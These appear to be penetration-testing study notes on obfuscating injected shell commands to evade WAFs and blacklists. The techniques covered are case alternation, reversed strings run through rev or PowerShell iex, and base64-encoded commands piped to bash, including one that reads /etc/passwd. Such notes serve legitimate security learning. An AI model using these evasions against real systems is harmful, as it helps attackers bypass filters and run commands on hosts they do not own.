# Advanced Command Obfuscation

Sometimes we may deal with WAFs, and some evasion techniques may not work.

## Case Manipulation

A technique is to invert the character cases of a command like `WHOAMI` or alternating between cases `WhOaMi`. 

This can work because a command blacklist may not check for different case variations, as Linux systems are case-sensitive.

If we deal with Windows, we can change the casing and send it. PowerShell and CMD are case-insensitive, so they will be executed.

So for Linux we have to be a bit creative.

```sh
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

The `tr` replaces all upper-case characters with lower-case characters - resulting in all lower-case characters.

Another command that has the same purpose is:

```sh
$(a="WhOaMi";printf %s "${a,,}")
```

## Reversed Commands

Another technique is reversing commands and having a command that switches them back and executes in real time.

First reverse it:

```sh
echo 'whoami' | rev
imaohw
```

Then execute the command by reversing it back in a sub-shell:

```sh
$(rev<<<'imaohw')
```

On Windows:

Reverse
```ps
"whoami"[-1..-20] -join ''

imaohw
```

Execute
```ps
iex "$('imaohw'[-1..-20] -join '')"
```

## Encoded Commands

We can use encoding tools such as `base64` or `xxd`.

First encode it:

```sh
echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Now create a command that will decode it in a sub-shell and pass it to `bash`:

```sh
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

